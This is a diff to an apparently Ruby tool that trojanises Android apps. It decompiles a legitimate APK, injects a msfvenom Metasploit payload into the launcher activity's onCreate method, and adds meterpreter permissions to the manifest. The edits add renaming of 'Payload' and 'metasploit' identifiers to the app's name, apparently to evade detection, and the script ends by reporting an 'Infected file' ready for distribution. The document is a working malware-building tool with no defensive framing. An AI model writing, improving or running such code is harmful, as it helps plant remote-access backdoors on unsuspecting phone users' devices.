@@ -280,7 +280,7 @@ unless(apkfile && File.readable?(apkfile))
   exit(1)
 end
 
-pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt","keytool","msfvenom"]
+pkgs = ["jarsigner", "apktool", "zipalign", "java", "apksigner","aapt","keytool","msfvenom", "xml2axml"]
 for pkg in pkgs do
   stdout, stderr, status = run_cmd(["which", pkg])
   unless(status.success?)
@@ -351,8 +351,10 @@ unless status.success?
 end
 
 run_cmd(["cp", apkfile, "#{cwd}/original.apk"])
+
 print_status("Decompiling orignal APK..")
 run_cmd(["apktool", "d", "-f", "-r", "-o", "#{cwd}/original", "#{cwd}/original.apk"])
+
 print_status("Decompiling AndroidManifest..")
 FileUtils.cp Dir.glob("#{cwd}/original/AndroidManifest.xml"), "#{cwd}/"
 FileUtils.rm_rf("#{cwd}/original/AndroidManifest.xml")
@@ -367,17 +369,19 @@ FileUtils.rm_rf("#{cwd}/AndroidManifest.xml")
 # FileUtils.rm_rf('original_tmp')
 print_status("Decompiling payload APK..")
 run_cmd(['apktool', 'd', '-f', '-o', "#{cwd}/payload", "#{cwd}/payload.apk"])
-
 f = File.open("original/AndroidManifest.xml")
 amanifest = Nokogiri::XML(f)
 f.close
 
 print_status("Locating onCreate() hook..")
 launcheractivity = findlauncheractivity(amanifest)
-#smalifile = 'original/smali/' + launcheractivity.gsub(/\./, "/") + '.smali'
-smalif = Dir["original/**/" + launcheractivity.gsub(/\./, "/").gsub("\n", ".smali")]
-smalif = smalif.to_s
-smalifile = smalif.gsub("[", "").gsub("]", "").gsub("", "")
+smali_path = launcheractivity.gsub(/\./, "/") + ".smali"
+matches = Dir.glob("original/**/*#{smali_path}").sort
+smalifile = matches.find { |f| f.include?("smali/") } || matches.first
+
+if matches.any?
+  smalifile = matches.first
+end 
 
 begin
   activitysmali = File.read(smalifile.to_s)
@@ -397,17 +401,17 @@ end
 print_status("Copying payload files..")
 apk_name=apkfile.split("/")[-1].gsub(".apk", "") 
 
+payload_dir = []
 Dir.glob(smalifile) do |path|
   # Extraer la parte hasta "com"
   file = Dir.glob("payload/smali/com/metasploit/stage/Pay*.smali").first
   com_dir = path[%r{^.*?/com}]
   payload_dir = "#{com_dir}/#{apk_name}/stage/"
-  
   FileUtils.mkdir_p(payload_dir)
   FileUtils.mv file, File.join(payload_dir, "#{apk_name}.smali")
 end 
 
-print "[*]─➤ Loading ".cyan,smalifile," and injecting payload..".cyan
+print_status("Loading #{smalifile} and injecting payload..")
 activitycreate = ';->onCreate(Landroid/os/Bundle;)V'
 payloadhook = "#{activitycreate}\n    invoke-static {p0}, Lcom/#{apk_name}/stage/#{apk_name};->start(Landroid/content/Context;)V"
 hookedsmali = activitysmali.gsub(activitycreate, payloadhook)
@@ -416,6 +420,16 @@ File.open(smalifile, "w") {|file| file.puts hookedsmali }
 injected_apk = "data/data/com_backdoored.apk"
 final_apk=apkfile.split("/")[-1]
 final_apk+="_final"
+
+print_status("Encoding payload..")
+File.write(
+  "#{payload_dir}#{apk_name}.smali", 
+  File.read("#{payload_dir}#{apk_name}.smali").gsub("Payload", "#{apk_name}")
+)
+File.write(
+  "#{payload_dir}#{apk_name}.smali",
+  File.read("#{payload_dir}#{apk_name}.smali").gsub("metasploit", "#{apk_name}")
+)
 
 print "\n"
 print_status("Poisoning the manifest with meterpreter permissions..")
@@ -500,6 +514,6 @@ if !status.success? || apksigner_verify.to_s.include?('DOES NOT VERIFY') || apks
   raise RuntimeError, 'Signature verification failed.'
   exit(1)
 else
-  cleaning_up()
+  # cleaning_up()
   print "[DONE]─➤ Infected file is ready in: ".green,"#{cwd}/#{final_apk}."
 end
